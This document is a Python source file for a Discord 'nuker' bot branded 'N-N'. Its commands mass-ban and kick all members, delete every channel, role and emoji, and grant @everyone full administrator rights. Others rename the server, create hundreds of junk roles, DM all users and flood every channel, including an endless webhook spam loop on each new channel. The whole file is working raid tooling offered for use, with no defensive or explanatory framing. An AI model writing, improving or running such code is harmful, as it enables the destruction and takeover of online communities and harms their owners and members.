import discord
import colorama
import json
from discord.ext import commands
import os
import random
from discord import Webhook
from discord import Permissions
import asyncio
from colorama import Fore, Style
from time import sleep
import sys
import os
import time


def smooth_print(text, delay=0.1):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

client = commands.Bot(command_prefix="!", intents=discord.Intents.all())

def Spinner():
	l = ['|', '/', '-', '\\', ' ']
	for i in l+l+l:
		sys.stdout.write(f"""\r {i}""")
		sys.stdout.flush()
		time.sleep(0.1)

def input_with_typing_animation(prompt, speed):
    user_input = ""
    for char in prompt:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    user_input = input()
    return user_input

typing_speed = 0.04  # Adjust the speed as needed
typing_speed1 = 0.01

Spinner()
smooth_print("/.\ Installing dependencies", 0.05)
sleep(0.3)
print("  /.\ Authenticating...")
sleep(0.5)
print("  /.\ Authenticated !")

token = input_with_typing_animation("\n  /.\ Bot Token [~]: ", typing_speed)

message1 = input_with_typing_animation("  /.\ Enter Message #1 (SPAM): ", typing_speed1)
message2 = input_with_typing_animation("  /.\ Enter Message #2 (SPAM): ", typing_speed1)
message3 = input_with_typing_animation("  /.\ Enter Message #3 (SPAM): ", typing_speed1)
channel1 = input_with_typing_animation("  /.\ Channel #1: ", typing_speed1)

channel2 = input_with_typing_animation("  /.\ Channel #2: ", typing_speed1)

CHANNEL_NAMES = [f"{channel1}",
                 f"{channel2}"]
MESSAGE_CONTENTS = [f"{message1}",
                    f"{message3}"
                    f"{message2}"]
# MESSAGE_CONTENTS = ["@everyone @here txz.x started nuke no one can save youu https://discord.com/invite/3csRVDthem" , " @everyone @here https://media.discordapp.net/attachments/982269240331612220/1198580429704396861/dark.gif?ex=65bf6c02&is=65acf702&hm=13e747670308fd1afbb4b23b6e0d2fe3f75b81f8b40408c173f2153f158a01ec&" ]
WEBHOOK_NAMES = ['N-N 🥀']

client.remove_command('help')


@client.command()
async def ban(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        if member.id != 695070568826929214:
            for user in list(ctx.guild.members):
                try:
                    await ctx.guild.ban(user)
                    smooth_print(f"{user.name} Was Banned")
                except:
                    pass


@client.command()
async def dmall(ctx, *, message: str):
    await ctx.message.delete()
    for channel in client.private_channels:
        try:
            await channel.send(f"{message}")
            print(f"Message Sent To {channel}")
        except:
            print(f"Message Not Sent To {channel}")


@client.command(pass_context=True)
async def admin(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        if role.name == '@everyone':
            try:
                await role.edit(permissions=Permissions.all())
                print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] @everyone has admin")
            except:
                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Failed to give @everyone admin")


@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(name="do !nn | N-N.exe 🥀"))


@client.command(pass_context=True)
async def name(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)


@client.command(pass_context=True)
async def emojidel(ctx):
    await ctx.message.delete()
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] {emoji.name} has been deleted in {ctx.guild.name}")
        except:
            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {emoji.name} has NOT been deleted in {ctx.guild.name}")


@client.command()
async def roles(ctx):
    await ctx.message.delete()
    for i in range(1, 250):
        try:
            await ctx.guild.create_role(name=f"N-N raid")
            print("Created Roles")
        except:
            print("Failed To Create Role")


@client.command()
async def nn(ctx, amount=20):
    await ctx.guild.edit(name="N-N was here 🥀")
    channels = ctx.guild.channels
    for channel in channels:
        try:
            await channel.delete()
            print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] {channel.name} + Has been maked")
        except:
            pass
            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] error")
            guild = ctx.message.guild
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] [{i}] channels made")
        except:
            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] error making channels")
    for role in ctx.guild.roles:
        try:
            await role.delet()
            print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] {role.name} deleted")

        except:
            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {role.name} not deleted")
    await asyncio.sleep(2)
    for i in range(100):
        for i in range(25):
            for channel in ctx.guild.channels:
                try:
                    await channel.send(random.choice(MESSAGE_CONTENTS))
                    print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] {channel.name} spammed")
                except:
                    print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {channel.name} not spammed")


@client.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name=random.choice(WEBHOOK_NAMES))
    while True:
        await channel.send(random.choice(MESSAGE_CONTENTS))
        await webhook.send(random.choice(MESSAGE_CONTENTS), username=random.choice(WEBHOOK_NAMES))


@client.command()
async def kick(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.kick(reason="Server has been seized by N-N")
            print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] {member.name} + Has Been Kicked")
        except:
            print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {member.name} + Can Not Kick")


@client.command()
async def help(ctx, *args):
    await ctx.message.delete()
    retStr = str(
        """```fix\n❄️ !nn - automods the server\n\n❄️ !ban - ban all (non threaded)\n\n❄️ |!kick - kick all\n\n❄️ !roles - spams roles\n\n❄️ !emojidel - deletes emojis\n\n❄️ !dmall - dms everyone in guild\n\n❄️ !name - changes guild name\n\n❄️ !admin - gives all admin ```""")
    embed = discord.Embed(color=0xfffafa, title="Discord Nuker ❄️")
    embed.add_field(name="Help ⚠️", value=retStr)
    embed.set_footer(text=f'N-N Help ⚠️')

    await ctx.send(embed=embed)

@client.command()
async def stop(ctx):
    await ctx.send(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Bot is stopping...")
    await ctx.send(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Bot is down")
    os._exit(1)


client.run(token)